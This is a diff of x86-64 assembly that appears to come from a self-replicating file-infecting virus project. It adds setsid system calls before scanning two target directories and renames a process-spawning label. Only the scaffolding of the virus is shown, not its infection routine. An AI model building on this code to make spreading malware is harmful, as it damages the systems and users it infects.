@@ -67,12 +67,11 @@ encrypted_start:
  ;   syscall
  ;   mov [rsp + ppid], rax
 
-birth_of_child:
     call get_processus_actif
     cmp rax, 0
     jnz exit
 
-
+birth_of_childs:
 scan_first_dir:
 
 ;    mov rax, SYS_FORK
@@ -81,6 +80,9 @@ scan_first_dir:
 ;    syscall
 ;    cmp rax, [rsp + ppid]
 ;    jz scan_second_dir
+
+    mov rax, SYS_SETSID
+    syscall
 
     lea rdi, [rsp + fileName]
     lea rsi, [rel firstDir]
@@ -96,6 +98,9 @@ scan_second_dir:
 ;    syscall
 ;    cmp rax, [rsp + ppid]
 ;    jz exit
+
+    mov rax, SYS_SETSID
+    syscall
 
     lea rdi, [rsp + fileName]
     lea rsi, [rel secondDir]
